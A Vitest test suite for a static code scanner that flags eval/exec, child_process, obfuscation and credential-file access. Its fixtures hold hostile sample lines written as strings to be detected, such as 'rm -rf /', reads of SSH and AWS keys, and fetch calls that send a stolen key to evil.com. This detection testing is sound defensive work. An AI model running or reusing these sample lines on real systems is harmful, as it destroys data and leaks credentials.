import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { mkdir, writeFile, rm } from 'fs/promises'
import { join } from 'path'
import { StaticAnalyzer } from './static.js'
import type { ScanContext } from './base.js'

const TEST_DIR = '/tmp/skillgate-static-test'

describe('StaticAnalyzer', () => {
  let analyzer: StaticAnalyzer

  beforeEach(async () => {
    analyzer = new StaticAnalyzer()
    await mkdir(TEST_DIR, { recursive: true })
  })

  afterEach(async () => {
    await rm(TEST_DIR, { recursive: true, force: true })
  })

  describe('metadata', () => {
    it('should have correct type', () => {
      expect(analyzer.type).toBe('static')
    })

    it('should have correct name', () => {
      expect(analyzer.name).toBe('Static Analyzer')
    })
  })

  describe('Dangerous API detection', () => {
    it('should detect eval() usage', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, 'const result = eval(userInput)')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_eval_usage')
      expect(findings[0].severity).toBe('high')
      expect(findings[0].metadata?.category).toBe('dangerous_api')
    })

    it('should detect exec() usage', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, 'exec("rm -rf /")')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_exec_usage')
      expect(findings[0].severity).toBe('high')
    })

    it('should detect child_process require', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "const cp = require('child_process')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_child_process')
      expect(findings[0].severity).toBe('medium')
    })

    it('should detect child_process import', async () => {
      const filePath = join(TEST_DIR, 'code.ts')
      await writeFile(filePath, "import { exec } from 'child_process'")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(1)
      const cpFinding = findings.find(f => f.rule === 'static_child_process')
      expect(cpFinding).toBeDefined()
    })

    it('should detect spawn/execSync usage', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, `
        spawn('ls', ['-la'])
        execSync('whoami')
        spawnSync('cat', ['/etc/passwd'])
      `)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(3)
      const spawnFindings = findings.filter(f => f.rule === 'static_spawn_exec')
      expect(spawnFindings.length).toBeGreaterThanOrEqual(3)
    })

    it('should detect file system operations', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, `
        writeFileSync('/etc/passwd', 'hacked')
        unlinkSync('/important/file')
        rmSync('/data', { recursive: true })
      `)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(3)
      const fsFindings = findings.filter(f => f.rule === 'static_fs_operations')
      expect(fsFindings.length).toBeGreaterThanOrEqual(3)
    })

    it('should detect network requests', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "fetch('https://evil.com/steal')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_network_fetch')
      expect(findings[0].severity).toBe('low')
    })
  })

  describe('Obfuscation detection', () => {
    it('should detect base64 decoding with Buffer.from', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "const decoded = Buffer.from(encoded, 'base64')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_base64_decode')
      expect(findings[0].severity).toBe('medium')
      expect(findings[0].metadata?.category).toBe('obfuscation')
    })

    it('should detect atob usage', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "const decoded = atob(encodedString)")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_base64_decode')
    })

    it('should detect character code obfuscation', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      // Long String.fromCharCode call
      await writeFile(filePath, 'const str = String.fromCharCode(72,101,108,108,111,44,32,87,111,114,108,100)')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_char_code_obfuscation')
      expect(findings[0].severity).toBe('high')
    })

    it('should detect hex-encoded strings', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      // Multiple hex-encoded characters
      await writeFile(filePath, 'const payload = "\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21"')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_hex_string')
      expect(findings[0].severity).toBe('medium')
    })

    it('should detect suspiciously long lines', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      // Create a line longer than 500 characters
      const longLine = 'a'.repeat(600)
      await writeFile(filePath, longLine)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_long_one_liner')
      expect(findings[0].severity).toBe('low')
    })
  })

  describe('Credential access detection', () => {
    it('should detect SSH credential access', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "const key = fs.readFileSync('~/.ssh/id_rsa')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(1)
      const sshFinding = findings.find(f => f.rule === 'static_ssh_access')
      expect(sshFinding).toBeDefined()
      expect(sshFinding?.severity).toBe('critical')
      expect(sshFinding?.metadata?.category).toBe('credential_access')
    })

    it('should detect AWS credential access', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "const creds = fs.readFileSync('~/.aws/credentials')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(1)
      const awsFinding = findings.find(f => f.rule === 'static_aws_credentials')
      expect(awsFinding).toBeDefined()
      expect(awsFinding?.severity).toBe('critical')
    })

    it('should detect .env file access', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, "dotenv.config({ path: '.env.production' })")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].rule).toBe('static_env_file_access')
      expect(findings[0].severity).toBe('high')
    })

    it('should detect browser credential storage access', async () => {
      const filePath = join(TEST_DIR, 'code.js')
      await writeFile(filePath, `
        const token = localStorage.getItem('auth')
        const session = sessionStorage.getItem('user')
        const cookies = document.cookie
      `)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(3)
      const browserFindings = findings.filter(f => f.rule === 'static_browser_credentials')
      expect(browserFindings.length).toBeGreaterThanOrEqual(3)
    })

    it('should detect keychain/keyring access', async () => {
      const filePath = join(TEST_DIR, 'code.py')
      await writeFile(filePath, "import keyring\nkeyring.get_password('service', 'user')")

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(1)
      const keychainFinding = findings.find(f => f.rule === 'static_keychain_access')
      expect(keychainFinding).toBeDefined()
      expect(keychainFinding?.severity).toBe('high')
    })
  })

  describe('File filtering', () => {
    it('should only scan code files', async () => {
      const codeFile = join(TEST_DIR, 'code.js')
      const textFile = join(TEST_DIR, 'readme.txt')
      const mdFile = join(TEST_DIR, 'docs.md')

      await writeFile(codeFile, 'eval("code")')
      await writeFile(textFile, 'eval("text")')
      await writeFile(mdFile, 'eval("md")')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [codeFile, textFile, mdFile]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].location.file).toBe('code.js')
    })

    it('should scan TypeScript files', async () => {
      const filePath = join(TEST_DIR, 'app.ts')
      await writeFile(filePath, 'eval("typescript")')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
    })

    it('should scan Python files', async () => {
      const filePath = join(TEST_DIR, 'script.py')
      await writeFile(filePath, 'exec("python")')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
    })

    it('should scan shell scripts', async () => {
      const filePath = join(TEST_DIR, 'deploy.sh')
      await writeFile(filePath, 'eval "$USER_INPUT"')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
    })
  })

  describe('Line number detection', () => {
    it('should report correct line number', async () => {
      const filePath = join(TEST_DIR, 'multiline.js')
      const content = `// Line 1
// Line 2
// Line 3
eval("dangerous")
// Line 5`
      await writeFile(filePath, content)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].location.line).toBe(4)
    })
  })

  describe('Multiple findings', () => {
    it('should detect multiple issues in one file', async () => {
      const filePath = join(TEST_DIR, 'malicious.js')
      const content = `
        eval(userInput)
        const key = fs.readFileSync('~/.ssh/id_rsa')
        fetch('https://evil.com/exfil?data=' + key)
      `
      await writeFile(filePath, content)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings.length).toBeGreaterThanOrEqual(3)
    })
  })

  describe('Edge cases', () => {
    it('should handle empty files', async () => {
      const filePath = join(TEST_DIR, 'empty.js')
      await writeFile(filePath, '')

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toEqual([])
    })

    it('should handle non-existent files gracefully', async () => {
      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: ['/non/existent/file.js']
      }

      const findings = await analyzer.scan(context)

      expect(findings).toEqual([])
    })

    it('should truncate long evidence', async () => {
      const filePath = join(TEST_DIR, 'long.js')
      const longCode = 'eval(' + 'a'.repeat(200) + ')'
      await writeFile(filePath, longCode)

      const context: ScanContext = {
        rootPath: TEST_DIR,
        files: [filePath]
      }

      const findings = await analyzer.scan(context)

      expect(findings).toHaveLength(1)
      expect(findings[0].evidence?.length).toBeLessThanOrEqual(100)
    })
  })
})
